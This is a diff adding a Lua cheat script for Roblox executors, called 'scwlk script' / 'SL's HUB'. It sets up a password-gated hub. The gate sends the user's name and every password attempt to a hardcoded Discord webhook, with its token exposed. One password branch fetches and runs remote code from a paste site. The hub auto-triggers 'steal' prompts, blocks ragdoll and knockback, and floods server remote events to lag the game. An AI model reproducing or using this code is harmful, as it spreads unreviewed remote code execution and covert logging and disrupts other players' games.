@@ -1,0 +1,241 @@
+-- scwlk script INTEGRATED (Lagger Removed from Omega Mode)
+task.wait(0.5)
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local ProximityPromptService = game:GetService("ProximityPromptService")
+local Stats = game:GetService("Stats")
+local localPlayer = Players.LocalPlayer
+
+-- 設定保存用ファイル名
+local CONFIG_FILE = "SL_Hub_Config.json"
+local AUTH_FILE = "SL_Hub_Auth.json"
+
+-- --- 共通: UI親の取得 ---
+local function getSafeParent()
+    local target = nil
+    pcall(function() target = game:GetService("CoreGui") end)
+    if target then return target end
+    local pGui = localPlayer:FindFirstChildOfClass("PlayerGui")
+    return pGui or game:GetService("StarterGui")
+end
+
+local parentUI = getSafeParent()
+
+-------------------------------------------------------
+-- ★ 認証セクション (AuthGui)
+-------------------------------------------------------
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1480174343232163980/fHuW_feZrwoZEt1VXDYjJM4IOs4EKsh689Jn9LHFUwxqYXjqlZsoWLeavDGTIHttREXN"
+local CORRECT_PASS = "HUNBARGAR"
+local OMEGA_PASS = "omegadrive"
+
+local function r(o, px) local c = Instance.new("UICorner") c.CornerRadius = UDim.new(0, px or 8) c.Parent = o end
+
+local function createAuthGui()
+    if parentUI:FindFirstChild("SLLaggerAuth") then parentUI.SLLaggerAuth:Destroy() end
+    if parentUI:FindFirstChild("SL_Hub_v6_Defender") then parentUI.SL_Hub_v6_Defender:Destroy() end
+
+    local AuthGui = Instance.new("ScreenGui")
+    AuthGui.Name = "SLLaggerAuth"
+    AuthGui.Parent = parentUI
+    AuthGui.ResetOnSpawn = false
+    AuthGui.DisplayOrder = 9999999
+
+    local function createGlow(name, offset, trans)
+        local g = Instance.new("Frame")
+        g.Name = name; g.Parent = AuthGui; g.BackgroundColor3 = Color3.fromRGB(150, 0, 255); g.BackgroundTransparency = trans; g.BorderSizePixel = 0
+        g.Position = UDim2.new(0.5, -135 - offset, 0.5, -150 - offset); g.Size = UDim2.new(0, 270 + (offset*2), 0, 320 + (offset*2))
+        return g
+    end
+
+    local Neon1 = createGlow("Neon1", 4, 0.75); local Neon2 = createGlow("Neon2", 8, 0.88); r(Neon1); r(Neon2)
+
+    local MainFrame = Instance.new("Frame", AuthGui)
+    MainFrame.Name = "MainFrame"; MainFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5); MainFrame.BorderSizePixel = 2; MainFrame.BorderColor3 = Color3.fromRGB(150, 0, 255)
+    MainFrame.Position = UDim2.new(0.5, -135, 0.5, -150); MainFrame.Size = UDim2.new(0, 270, 0, 320); MainFrame.Active = true; MainFrame.Draggable = true
+    r(MainFrame)
+
+    MainFrame:GetPropertyChangedSignal("Position"):Connect(function()
+        Neon1.Position = MainFrame.Position + UDim2.new(0, -4, 0, -4)
+        Neon2.Position = MainFrame.Position + UDim2.new(0, -8, 0, -8)
+    end)
+
+    local BackBtn = Instance.new("TextButton", MainFrame)
+    BackBtn.Size = UDim2.new(0, 35, 0, 35); BackBtn.Position = UDim2.new(0, 10, 0, 10); BackBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 255); BackBtn.Text = "↩︎"; BackBtn.TextColor3 = Color3.fromRGB(255, 255, 255); BackBtn.TextSize = 20; BackBtn.Font = Enum.Font.GothamBold; BackBtn.Visible = false; r(BackBtn, 17.5)
+    local BackStroke = Instance.new("UIStroke", BackBtn); BackStroke.Thickness = 2; BackStroke.Color = Color3.fromRGB(255, 0, 0); BackStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+    local Title = Instance.new("TextLabel", MainFrame)
+    Title.Size = UDim2.new(1, 0, 0, 65); Title.BackgroundTransparency = 1; Title.Text = "scwlk  script"; Title.TextSize = 28; Title.Font = Enum.Font.GothamBold; Title.TextColor3 = Color3.fromRGB(255, 255, 255); Title.TextStrokeTransparency = 0; Title.TextStrokeColor3 = Color3.fromRGB(255, 0, 0)
+
+    local UserIcon = Instance.new("ImageLabel", MainFrame)
+    UserIcon.Position = UDim2.new(0.5, -35, 0, 65); UserIcon.Size = UDim2.new(0, 70, 0, 70); UserIcon.BackgroundColor3 = Color3.fromRGB(15, 15, 15); UserIcon.BorderColor3 = Color3.fromRGB(150, 0, 255); UserIcon.Visible = false; r(UserIcon, 35)
+
+    local TopLabel = Instance.new("TextLabel", MainFrame)
+    TopLabel.Position = UDim2.new(0, 35, 0, 140); TopLabel.Size = UDim2.new(0, 200, 0, 25); TopLabel.BackgroundTransparency = 1; TopLabel.Text = "Username"; TopLabel.TextSize = 16; TopLabel.Font = Enum.Font.GothamBold; TopLabel.TextColor3 = Color3.fromRGB(255, 255, 255); TopLabel.TextStrokeColor3 = Color3.fromRGB(150, 0, 255); TopLabel.TextStrokeTransparency = 0; TopLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local InputBox = Instance.new("TextBox", MainFrame)
+    InputBox.Position = UDim2.new(0, 35, 0, 165); InputBox.Size = UDim2.new(0, 200, 0, 45); InputBox.BackgroundColor3 = Color3.fromRGB(15, 15, 15); InputBox.BorderColor3 = Color3.fromRGB(150, 0, 255); InputBox.PlaceholderText = "..."; InputBox.Text = ""; InputBox.TextColor3 = Color3.fromRGB(255, 255, 255); InputBox.Font = Enum.Font.Gotham; InputBox.ClearTextOnFocus = false; r(InputBox)
+
+    local ActionBtn = Instance.new("TextButton", MainFrame)
+    ActionBtn.Position = UDim2.new(0, 35, 0, 240); ActionBtn.Size = UDim2.new(0, 200, 0, 50); ActionBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 255); ActionBtn.Text = "NEXT"; ActionBtn.TextColor3 = Color3.fromRGB(255, 255, 255); ActionBtn.TextSize = 18; ActionBtn.Font = Enum.Font.GothamBold; ActionBtn.BorderSizePixel = 0; r(ActionBtn)
+
+    local step = "User"
+    local tName, tId = "", 0
+
+    local function sendLog(isOk, pAttempt)
+        local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tId .. "&width=420&height=420&format=png"
+        local data = {["embeds"] = {{["title"] = "scwlk script LOG", ["thumbnail"] = {["url"]= avatar}, ["color"] = isOk and 65280 or 16711680, ["description"] = string.format("👤実行者: %s\n👥入力ID: %s\n🔐パスワード: %s\n☑️結果: %s", localPlayer.Name, tName, pAttempt, isOk and "SUCCESS" or "FAILED")}}}
+        local req = syn and syn.request or http_request or request or (http and http.request)
+        if req then req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
+    end
+
+    local function saveAuth() writefile(AUTH_FILE, HttpService:JSONEncode({["userId"] = localPlayer.UserId, ["expiry"] = os.time() + (24*60*60)})) end
+
+    BackBtn.MouseButton1Click:Connect(function()
+        step = "User"; BackBtn.Visible = false; UserIcon.Visible = false; TopLabel.Text = "Username"; TopLabel.TextColor3 = Color3.fromRGB(255, 255, 255); InputBox.Text = ""; ActionBtn.Text = "NEXT"; ActionBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 255)
+    end)
+
+    ActionBtn.MouseButton1Click:Connect(function()
+        if step == "User" then
+            tName = InputBox.Text; local ok, id = pcall(function() return Players:GetUserIdFromNameAsync(tName) end)
+            if ok and id then
+                tId = id; UserIcon.Image = "rbxthumb://type=AvatarHeadShot&id="..id.."&w=150&h=150"; UserIcon.Visible = true; TopLabel.Text = tName; InputBox.Text = ""; ActionBtn.Text = "SIGN IN"; step = "Pass"; BackBtn.Visible = true
+            else
+                ActionBtn.Text = "NOT FOUND"; task.wait(1); ActionBtn.Text = "NEXT"
+            end
+        elseif step == "Pass" then
+            local p = InputBox.Text
+            if p == CORRECT_PASS then
+                sendLog(true, p); if tId == localPlayer.UserId then saveAuth() end
+                ActionBtn.Text = "AUTHORIZED ✅"; ActionBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 100); task.wait(0.5); 
+                AuthGui:Destroy(); 
+                startMainHub() -- HUNBARGARの時は通常のHUBを起動
+            elseif p == OMEGA_PASS then
+                sendLog(true, p); if tId == localPlayer.UserId then saveAuth() end
+                ActionBtn.Text = "OMEGA ACTIVATED ✅"; ActionBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 255); task.wait(0.5); 
+                AuthGui:Destroy(); 
+                loadstring(game:HttpGet("https://pastefy.app/ZfV0nU6V/raw"))() -- omegadriveの時は外部スクリプトのみ
+            else
+                sendLog(false, p); ActionBtn.Text = "DENIED"; ActionBtn.BackgroundColor3 = Color3.fromRGB(220, 0, 0); task.wait(1); ActionBtn.Text = "RETRY"; ActionBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 255)
+            end
+        end
+    end)
+end
+
+-------------------------------------------------------
+-- ★ メインスクリプト (GUI) - HUNBARGAR専用
+-------------------------------------------------------
+function startMainHub()
+    local ScreenGui = Instance.new("ScreenGui", parentUI)
+    ScreenGui.Name = "SL_Hub_v6_Defender"; ScreenGui.ResetOnSpawn = false
+
+    local function addCorner(obj, rad) local c = Instance.new("UICorner", obj); c.CornerRadius = UDim.new(0, rad or 8) end
+
+    local _G_HUB_CONFIG = {
+        antiLag = false, effectKill = false, antiRag = false, antiKB = false,
+        lagItem = false, lagClone = false, autoGrab = false, autoKick = false,
+        isAutoClickMode = false, is1ClickMode = false, laggerActive = false
+    }
+
+    local function loadConfig()
+        if isfile(CONFIG_FILE) then
+            local success, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
+            if success then for k, v in pairs(data) do if _G_HUB_CONFIG[k] ~= nil then _G_HUB_CONFIG[k] = v end end end
+        end
+    end
+    local function saveConfig() writefile(CONFIG_FILE, HttpService:JSONEncode(_G_HUB_CONFIG)) end
+    loadConfig()
+
+    local rainbowSequence = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.4, Color3.fromRGB(0, 255, 0)), ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 255)), ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 255))})
+    local silverGradient = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 140, 140)), ColorSequenceKeypoint.new(0.25, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 100, 100)), ColorSequenceKeypoint.new(0.75, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(140, 140, 140))})
+
+    local StatusBoard = Instance.new("Frame", ScreenGui); StatusBoard.Size = UDim2.new(0, 260, 0, 80); StatusBoard.Position = UDim2.new(0.5, -130, 0, 20); StatusBoard.BackgroundColor3 = Color3.fromRGB(150, 0, 0); StatusBoard.BackgroundTransparency = 0.7; addCorner(StatusBoard, 12)
+    local BoardStroke = Instance.new("UIStroke", StatusBoard); BoardStroke.Thickness = 5; BoardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    local BoardGradient = Instance.new("UIGradient", BoardStroke); BoardGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))})
+    local GlossText = Instance.new("TextLabel", StatusBoard); GlossText.Size = UDim2.new(1, 0, 0, 45); GlossText.BackgroundTransparency = 1; GlossText.Text = "SL's HUB"; GlossText.TextColor3 = Color3.fromRGB(255, 255, 255); GlossText.Font = Enum.Font.GothamBlack; GlossText.TextSize = 30
+    local TextStroke = Instance.new("UIStroke", GlossText); TextStroke.Thickness = 4; TextStroke.Color = Color3.fromRGB(255, 140, 0)
+    local TextGradient = Instance.new("UIGradient", GlossText); TextGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 200, 200)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))})
+    local InfoLabel = Instance.new("TextLabel", StatusBoard); InfoLabel.Size = UDim2.new(1, 0, 0, 30); InfoLabel.Position = UDim2.new(0, 0, 0, 45); InfoLabel.BackgroundTransparency = 1; InfoLabel.TextColor3 = Color3.fromRGB(255, 255, 255); InfoLabel.Font = Enum.Font.Code; InfoLabel.TextSize = 16
+    local InfoStroke = Instance.new("UIStroke", InfoLabel); InfoStroke.Thickness = 2; InfoStroke.Color = Color3.fromRGB(150, 0, 255)
+    local InfoGradient = Instance.new("UIGradient", InfoLabel); InfoGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 200, 200)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))})
+
+    task.spawn(function() while task.wait(0.5) do local fps = math.floor(1/RunService.RenderStepped:Wait()); local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()); InfoLabel.Text = string.format("PING: %d ms | FPS: %d", ping, fps) end end)
+
+    local Main = Instance.new("Frame", ScreenGui); Main.Size = UDim2.new(0, 320, 0, 360); Main.Position = UDim2.new(0.5, -340, 0.4, 0); Main.BackgroundColor3 = Color3.fromRGB(255, 0, 0); Main.BackgroundTransparency = 0.6; addCorner(Main, 10)
+    local MainStroke = Instance.new("UIStroke", Main); MainStroke.Thickness = 2; MainStroke.Color = Color3.fromRGB(150, 0, 255)
+    local TitleBar = Instance.new("Frame", ScreenGui); TitleBar.Size = UDim2.new(0, 320, 0, 35); TitleBar.Position = Main.Position - UDim2.new(0, 0, 0, 38); TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20); TitleBar.Active = true; TitleBar.Draggable = true; addCorner(TitleBar, 4)
+    local TitleStroke = Instance.new("UIStroke", TitleBar); TitleStroke.Thickness = 4; TitleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; local TitleFrameGradient = Instance.new("UIGradient", TitleStroke); TitleFrameGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 0, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 200, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 0, 255))})
+    local BarLabel = Instance.new("TextLabel", TitleBar); BarLabel.Size = UDim2.new(1, -70, 1, 0); BarLabel.Position = UDim2.new(0, 10, 0, 0); BarLabel.Text = "CONTROL PANEL"; BarLabel.TextColor3 = Color3.fromRGB(255, 255, 255); BarLabel.BackgroundTransparency = 1; BarLabel.Font = Enum.Font.GothamBold; BarLabel.TextSize = 14; BarLabel.TextXAlignment = Enum.TextXAlignment.Left
+    local BarTextGradient = Instance.new("UIGradient", BarLabel); BarTextGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 140, 0)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 250, 200)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 140, 0))})
+
+    local HubBackBtn = Instance.new("TextButton", TitleBar)
+    HubBackBtn.Size = UDim2.new(0, 26, 0, 26); HubBackBtn.Position = UDim2.new(1, -65, 0, 4.5); HubBackBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 255); HubBackBtn.Text = "↩︎"; HubBackBtn.TextColor3 = Color3.fromRGB(255, 255, 255); HubBackBtn.TextSize = 16; HubBackBtn.Font = Enum.Font.GothamBold; addCorner(HubBackBtn, 13)
+    local HubBackStroke = Instance.new("UIStroke", HubBackBtn); HubBackStroke.Thickness = 2; HubBackStroke.Color = Color3.fromRGB(255, 0, 0)
+    HubBackBtn.MouseButton1Click:Connect(function() ScreenGui:Destroy(); createAuthGui() end)
+
+    local ToggleBtn = Instance.new("TextButton", TitleBar); ToggleBtn.Size = UDim2.new(0, 26, 0, 26); ToggleBtn.Position = UDim2.new(1, -33, 0, 4.5); ToggleBtn.Text = "-"; ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255); ToggleBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40); addCorner(ToggleBtn, 4)
+    ToggleBtn.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible; ToggleBtn.Text = Main.Visible and "-" or "+" end)
+    RunService.RenderStepped:Connect(function() Main.Position = TitleBar.Position + UDim2.new(0, 0, 0, 38) end)
+
+    local Content = Instance.new("Frame", Main); Content.Size = UDim2.new(1, 0, 1, 0); Content.BackgroundTransparency = 1
+    local allButtons = {}
+    local function createBtn(name, pos, key, isMode)
+        local b = Instance.new("TextButton", Content); b.Size = UDim2.new(0, 100, 0, 30); b.Position = pos; b.BackgroundColor3 = Color3.fromRGB(0, 0, 0); b.BackgroundTransparency = 0.5; b.TextColor3 = Color3.fromRGB(255, 255, 255); b.Font = Enum.Font.GothamBold; b.TextSize = 9; addCorner(b, 4)
+        local function updateVisual() local active = isMode and ((key == "is1ClickMode" and _G_HUB_CONFIG.is1ClickMode) or (key == "isAutoClickMode" and _G_HUB_CONFIG.isAutoClickMode)) or _G_HUB_CONFIG[key]; b.Text = isMode and name or (name .. (active and " : ON" or " : OFF")); b.BackgroundColor3 = active and Color3.fromRGB(150, 0, 255) or Color3.fromRGB(0, 0, 0) end
+        b.MouseButton1Click:Connect(function() if isMode then _G_HUB_CONFIG.is1ClickMode = (key == "is1ClickMode"); _G_HUB_CONFIG.isAutoClickMode = (key == "isAutoClickMode") else _G_HUB_CONFIG[key] = not _G_HUB_CONFIG[key] end; saveConfig(); for _, f in pairs(allButtons) do f() end end)
+        updateVisual(); table.insert(allButtons, updateVisual)
+    end
+    createBtn("Anti-Lag", UDim2.new(0, 15, 0, 15), "antiLag"); createBtn("Effect Kill", UDim2.new(0, 15, 0, 50), "effectKill"); createBtn("Anti-Rag", UDim2.new(0, 15, 0, 85), "antiRag"); createBtn("1 Click Mode", UDim2.new(0, 15, 0, 135), "is1ClickMode", true); createBtn("Auto Click Mode", UDim2.new(0, 15, 0, 170), "isAutoClickMode", true); createBtn("Auto Grab", UDim2.new(0, 15, 0, 210), "autoGrab"); createBtn("Auto Kick", UDim2.new(0, 125, 0, 210), "autoKick"); createBtn("Lag Item", UDim2.new(0, 15, 0, 265), "lagItem"); createBtn("Lag Clone", UDim2.new(0, 15, 0, 300), "lagClone")
+    local Lagger = Instance.new("TextButton", Content); Lagger.Size = UDim2.new(0, 100, 0, 50); Lagger.Position = UDim2.new(0, 175, 0, 272); Lagger.BackgroundColor3 = Color3.fromRGB(255, 0, 0); Lagger.Text = "LAGGER"; Lagger.TextColor3 = Color3.fromRGB(255, 255, 255); Lagger.Font = Enum.Font.GothamBlack; Lagger.TextSize = 18; addCorner(Lagger, 8)
+    local function updateLagV() Lagger.BackgroundColor3 = _G_HUB_CONFIG.laggerActive and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0) end
+    updateLagV(); Lagger.MouseButton1Click:Connect(function() _G_HUB_CONFIG.laggerActive = not _G_HUB_CONFIG.laggerActive; saveConfig(); updateLagV() end)
+
+    local Main2 = Instance.new("Frame", ScreenGui); Main2.Size = UDim2.new(0, 320, 0, 360); Main2.Position = UDim2.new(0.5, 20, 0.4, 0); Main2.BackgroundColor3 = Color3.fromRGB(0, 0, 0); Main2.BackgroundTransparency = 0.5; addCorner(Main2, 10)
+    local Main2Stroke = Instance.new("UIStroke", Main2); Main2Stroke.Thickness = 4; local Main2SGrad = Instance.new("UIGradient", Main2Stroke); Main2SGrad.Color = rainbowSequence
+    local TBar2 = Instance.new("Frame", ScreenGui); TBar2.Size = UDim2.new(0, 320, 0, 35); TBar2.Position = Main2.Position - UDim2.new(0, 0, 0, 38); TBar2.BackgroundColor3 = Color3.fromRGB(15, 15, 15); addCorner(TBar2, 4); TBar2.Active = true; TBar2.Draggable = true
+    local T2Stroke = Instance.new("UIStroke", TBar2); T2Stroke.Thickness = 4; local T2SGrad = Instance.new("UIGradient", T2Stroke); T2SGrad.Color = rainbowSequence
+    local L2 = Instance.new("TextLabel", TBar2); L2.Size = UDim2.new(1, -40, 1, 0); L2.Position = UDim2.new(0, 10, 0, 0); L2.Text = "SISTEM CONTROL"; L2.TextColor3 = Color3.fromRGB(255, 255, 255); L2.BackgroundTransparency = 1; L2.Font = Enum.Font.GothamBold; L2.TextSize = 14; L2.TextXAlignment = Enum.TextXAlignment.Left
+    local L2SilverGrad = Instance.new("UIGradient", L2); L2SilverGrad.Color = silverGradient
+    local L2Stroke = Instance.new("UIStroke", L2); L2Stroke.Thickness = 2; local L2SGrad = Instance.new("UIGradient", L2Stroke); L2SGrad.Color = rainbowSequence
+    local ToggleBtn2 = Instance.new("TextButton", TBar2); ToggleBtn2.Size = UDim2.new(0, 30, 0, 30); ToggleBtn2.Position = UDim2.new(1, -35, 0, 2.5); ToggleBtn2.Text = "-"; ToggleBtn2.TextColor3 = Color3.fromRGB(255, 255, 255); ToggleBtn2.BackgroundColor3 = Color3.fromRGB(40, 40, 40); addCorner(ToggleBtn2, 4)
+    ToggleBtn2.MouseButton1Click:Connect(function() Main2.Visible = not Main2.Visible; ToggleBtn2.Text = Main2.Visible and "-" or "+" end)
+    RunService.RenderStepped:Connect(function() Main2.Position = TBar2.Position + UDim2.new(0, 0, 0, 38) end)
+
+    local function createSistemBtn(name, pos, key)
+        local b = Instance.new("TextButton", Main2); b.Size = UDim2.new(0, 120, 0, 35); b.Position = pos; b.BackgroundColor3 = Color3.fromRGB(20, 20, 20); b.TextColor3 = Color3.fromRGB(255, 255, 255); b.Font = Enum.Font.GothamBold; b.TextSize = 10; addCorner(b, 4)
+        local function up() b.Text = name .. " : " .. (_G_HUB_CONFIG[key] and "ON" or "OFF"); b.TextColor3 = _G_HUB_CONFIG[key] and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 255, 255) end
+        up(); b.MouseButton1Click:Connect(function() _G_HUB_CONFIG[key] = not _G_HUB_CONFIG[key]; saveConfig(); up() end)
+    end
+    createSistemBtn("Anti Ragdoll", UDim2.new(0, 15, 0, 15), "antiRag"); createSistemBtn("Anti Knockback", UDim2.new(0, 15, 0, 60), "antiKB")
+
+    RunService.Heartbeat:Connect(function() if _G_HUB_CONFIG.antiKB then local root = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") if root then local vel = root.Velocity; root.Velocity = Vector3.new(0, vel.Y, 0) end end end)
+    task.spawn(function() local function applyRagFix(char) local hum = char:WaitForChild("Humanoid", 5) if hum then hum.StateChanged:Connect(function(_, newState) if _G_HUB_CONFIG.antiRag and (newState == Enum.HumanoidStateType.Ragdoll or newState == Enum.HumanoidStateType.FallingDown or newState == Enum.HumanoidStateType.PlatformStanding) then hum:ChangeState(Enum.HumanoidStateType.GettingUp) end end) end end localPlayer.CharacterAdded:Connect(applyRagFix) if localPlayer.Character then applyRagFix(localPlayer.Character) end while task.wait(0.1) do if _G_HUB_CONFIG.antiRag then local hum = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid") if hum then hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false); hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false) end end end end)
+    local playerGui = localPlayer:WaitForChild("PlayerGui")
+    playerGui.DescendantAdded:Connect(function(obj) if _G_HUB_CONFIG.autoKick and (obj:IsA("TextLabel") or obj:IsA("TextButton")) then local rawText = obj.Text:lower(); local ignore = {"ing", "ています", "ようとして", "誰かが", "someone", "盗まれた"} local isExempt = false; for _, w in ipairs(ignore) do if rawText:find(w) then isExempt = true break end end if not isExempt and (rawText:find("stole") or rawText:find("盗んだ") or rawText:find("手に入れた")) then task.wait(0.01); localPlayer:Kick("scwlk script autokick:(" .. obj.Text .. ")") end end end)
+    local currentPrompt = nil; ProximityPromptService.PromptShown:Connect(function(prompt) local pText = (prompt.ObjectText .. prompt.ActionText):lower() if pText:find("steal") or pText:find("盗む") then currentPrompt = prompt end end)
+    task.spawn(function() while true do task.wait(0.05) if _G_HUB_CONFIG.autoGrab and currentPrompt and currentPrompt.Enabled and currentPrompt.Parent then if _G_HUB_CONFIG.isAutoClickMode then fireproximityprompt(currentPrompt) elseif _G_HUB_CONFIG.is1ClickMode then fireproximityprompt(currentPrompt); currentPrompt = nil end end end end)
+    local MeterFrame = Instance.new("Frame", ScreenGui); MeterFrame.Size = UDim2.new(0, 300, 0, 20); MeterFrame.Position = UDim2.new(0.5, -150, 1, -50); MeterFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 50); MeterFrame.Visible = false; addCorner(MeterFrame, 10)
+    local MeterFill = Instance.new("Frame", MeterFrame); MeterFill.Size = UDim2.new(0, 0, 1, 0); MeterFill.BackgroundColor3 = Color3.fromRGB(150, 0, 255); addCorner(MeterFill, 8)
+    local PercentageText = Instance.new("TextLabel", MeterFrame); PercentageText.Size = UDim2.new(1, 0, 1, 0); PercentageText.BackgroundTransparency = 1; PercentageText.Text = "0%"; PercentageText.TextColor3 = Color3.fromRGB(255, 255, 255); PercentageText.Font = Enum.Font.GothamBold; PercentageText.TextSize = 12; PercentageText.ZIndex = 2
+    task.spawn(function() while task.wait() do if _G_HUB_CONFIG.autoGrab and not _G_HUB_CONFIG.laggerActive then MeterFrame.Visible = true; for i = 0, 100, 10 do MeterFill.Size = UDim2.new(i/100, 0, 1, 0); PercentageText.Text = i .. "%"; task.wait(0.01) end else MeterFrame.Visible = false end end end)
+    task.spawn(function() while task.wait() do if _G_HUB_CONFIG.laggerActive then local char = localPlayer.Character; if char then if _G_HUB_CONFIG.lagItem then for _, item in pairs(localPlayer.Backpack:GetChildren()) do if item:IsA("Tool") and item.Name ~= "Cloner" then item.Parent = char; item:Activate() end end end if _G_HUB_CONFIG.lagClone then local cloner = char:FindFirstChild("Cloner") or localPlayer.Backpack:FindFirstChild("Cloner") if cloner then cloner.Parent = char; cloner:Activate(); local remote = cloner:FindFirstChildOfClass("RemoteEvent"); if remote then remote:FireServer() end end end end end end end)
+    task.spawn(function() local o = -1 while true do o = o + 0.02; if o > 1 then o = -1 end BoardGradient.Offset = Vector2.new(o, 0); TextGradient.Offset = Vector2.new(o, 0); InfoGradient.Offset = Vector2.new(o, 0); TitleFrameGradient.Offset = Vector2.new(o, 0); BarTextGradient.Offset = Vector2.new(o, 0); Main2SGrad.Offset = Vector2.new(o, 0); T2SGrad.Offset = Vector2.new(o, 0); L2SGrad.Offset = Vector2.new(o, 0); L2SilverGrad.Offset = Vector2.new(o, 0); task.wait(0.01) end end)
+end
+
+-------------------------------------------------------
+-- ★ 実行開始ロジック
+-------------------------------------------------------
+local function checkAuth()
+    if isfile(AUTH_FILE) then
+        local success, data = pcall(function() return HttpService:JSONDecode(readfile(AUTH_FILE)) end)
+        if success and data.userId == localPlayer.UserId and os.time() < data.expiry then return true end
+    end
+    return false
+end
+
+if checkAuth() then
+    startMainHub()
+else
+    createAuthGui()
+end
